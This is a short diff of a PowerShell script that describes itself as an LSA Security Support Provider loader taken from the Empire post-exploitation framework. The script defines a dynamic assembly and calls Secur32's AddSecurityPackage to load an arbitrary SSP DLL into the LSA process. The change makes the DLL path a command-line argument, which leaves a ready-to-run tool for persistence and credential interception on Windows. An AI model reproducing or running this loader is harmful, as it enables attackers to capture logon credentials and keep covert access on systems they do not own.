@@ -1,4 +1,5 @@
 # lsa ssp loader ripped from Empire's Instal-SSP.ps1 
+# provide path to SSP DLL as argument
 
 $DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2')
 $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
@@ -25,6 +26,6 @@ if ([IntPtr]::Size -eq 4) {
 $StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize)
 [Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize)
 
-$DllName = "<path to ssp goes here>"
+$DllName = $args[0]
 $Secur32::AddSecurityPackage($DllName, $StructPtr)
 
